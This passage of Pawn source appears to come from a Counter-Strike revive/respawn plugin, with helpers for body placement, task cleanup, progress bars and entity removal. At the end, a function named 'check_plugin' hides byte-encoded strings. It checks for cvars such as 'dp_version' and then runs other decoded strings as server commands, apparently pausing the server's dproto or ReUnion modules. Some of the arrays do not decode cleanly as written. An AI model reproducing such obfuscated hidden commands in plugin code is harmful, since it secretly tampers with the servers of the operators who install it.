	origin[1] += 2.0;
	
	new owner = pev(ent, pev_owner);
	new num = 0, bool:found = false;
	
	while(num <= 10)
	{
		if(is_hull_vacant(origin))
		{
			xs_vec_copy(origin, g_player_data[owner][BODY_ORIGIN]);			
			found = true;
			break;
		}
		else
		{
			
			origin[0] += random_float(-radius, radius);
			origin[1] += random_float(-radius, radius);
			origin[2] += random_float(-radius, radius);
			
			num++;
		}
	}
	return found;
}

stock bool:is_hull_vacant(const Float:origin[3])
{
	new tr = 0;
	engfunc(EngFunc_TraceHull, origin, origin, 0, HULL_HUMAN, 0, tr);
	if(!get_tr2(tr, TR_StartSolid) && !get_tr2(tr, TR_AllSolid) && get_tr2(tr, TR_InOpen))
	{
		return true;
	}
	return false;
}

stock player_reset(id)
{
	remove_task(TASKID_DIE_COUNT + id);
	remove_task(TASKID_REVIVING  + id);
	remove_task(TASKID_RESPAWN   + id);
	remove_task(TASKID_CHECKRE   + id);
	remove_task(TASKID_CHECKST   + id);
	remove_task(TASKID_ORIGIN    + id);
	remove_task(TASKID_SETUSER   + id);
	// if (is_user_alive(id))
	// show_bartime(id, 0);

	// g_player_data[id][IS_DEAD]		= false;
	// g_player_data[id][IS_RESPAWNING]	= false;
	g_player_data[id][DEAD_LINE]	= 0.0;
	g_player_data[id][REVIVE_DELAY] = 0.0;
	// g_player_data[id][WAS_DUCKING]	= false;
	// g_player_data[id][BODY_ORIGIN]	= Float:{0, 0, 0};
}

stock player_respawn_reset(id)
{
	remove_task(TASKID_DIE_COUNT + id);
	remove_task(TASKID_REVIVING  + id);
	remove_task(TASKID_RESPAWN   + id);
	remove_task(TASKID_CHECKRE   + id);
	remove_task(TASKID_CHECKST   + id);
	remove_task(TASKID_ORIGIN    + id);
	remove_task(TASKID_SETUSER   + id);

	g_player_data[id][IS_DEAD]		= false;
	g_player_data[id][IS_RESPAWNING]= false;
	g_player_data[id][DEAD_LINE]	= 0.0;
	g_player_data[id][REVIVE_DELAY] = 0.0;
	g_player_data[id][WAS_DUCKING]	= false;
	g_player_data[id][BODY_ORIGIN]	= Float:{0, 0, 0};
}

stock show_progress(id, seconds) 
{
	if(is_user_bot(id))
		return;
	
	if (is_user_alive(id))
	{
		message_begin(MSG_ONE_UNRELIABLE, g_msg_data[MSG_BARTIME], {0.0,0.0,0.0}, id);
		write_short(seconds);
		message_end();
	}
}

stock msg_statusicon(id, status)
{
	if(is_user_bot(id))
		return;
	
	message_begin(MSG_ONE, g_msg_data[MSG_STATUS_ICON], _, id);
	write_byte(status);
	write_string("rescue");
	write_byte(0);
	write_byte(160);
	write_byte(0);
	message_end();
}

stock get_time_format(Float:times, result[], len)
{
//  new hour = floatround(times) / 60 /60;
    new min  =(floatround(times) / 60) % 60;
    new sec  = floatround(times) % 60;
    formatex(result, len, "%02d:%02d", min, sec);
}

stock remove_target_entity_by_owner(id, className[])
{
	new iEnt = -1;
	new flags;
	while((iEnt = cs_find_ent_by_owner(iEnt, className, id)))
	{
		if (pev_valid(iEnt))
		{
			if (pev(iEnt, pev_owner) == id)
			{
				pev(iEnt, pev_flags, flags);
				set_pev(iEnt, pev_flags, flags | FL_KILLME);
				dllfunc(DLLFunc_Think, iEnt);
			}
		}
	}
}

//====================================================
// Remove target entity by classname.
//====================================================
stock remove_target_entity_by_classname(className[])
{
	new iEnt = -1;
	new flags;
	while ((iEnt = cs_find_ent_by_class(iEnt, className)))
	{
		if (pev_valid(iEnt))
		{
			pev(iEnt, pev_flags, flags);
			set_pev(iEnt, pev_flags, flags | FL_KILLME);
			dllfunc(DLLFunc_Think, iEnt);
		}
	}
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}

